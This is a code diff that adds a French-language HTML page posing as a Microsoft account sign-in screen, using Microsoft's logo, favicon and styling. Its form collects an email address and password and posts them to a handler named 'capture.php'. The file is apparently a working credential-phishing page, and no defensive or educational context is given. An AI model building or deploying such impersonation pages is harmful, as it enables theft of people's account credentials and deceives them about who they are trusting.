@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion à votre compte</title>
+  <link rel="icon" href="https://secure.aadcdn.microsoftonline-p.com/favicon.ico">
+  <style>
+    body { font-family: Segoe UI, sans-serif; background: #f3f2f1; display: flex; align-items: center; justify-content: center; height: 100vh; }
+    .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 320px; }
+    input { width: 100%; padding: 10px; margin-top: 15px; border: 1px solid #ccc; border-radius: 4px; }
+    button { width: 100%; padding: 10px; background: #0078d4; color: white; border: none; margin-top: 20px; border-radius: 4px; font-weight: bold; }
+    .logo { text-align: center; margin-bottom: 20px; }
+  </style>
+</head>
+<body>
+  <form class="login-box" method="POST" action="capture.php">
+    <div class="logo">
+      <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248cbd91bb.svg" alt="Microsoft" height="30">
+    </div>
+    <label for="email">Adresse e-mail</label>
+    <input type="email" name="email" id="email" required>
+    <label for="password">Mot de passe</label>
+    <input type="password" name="password" id="password" required>
+    <button type="submit">Suivant</button>
+  </form>
+</body>
+</html>
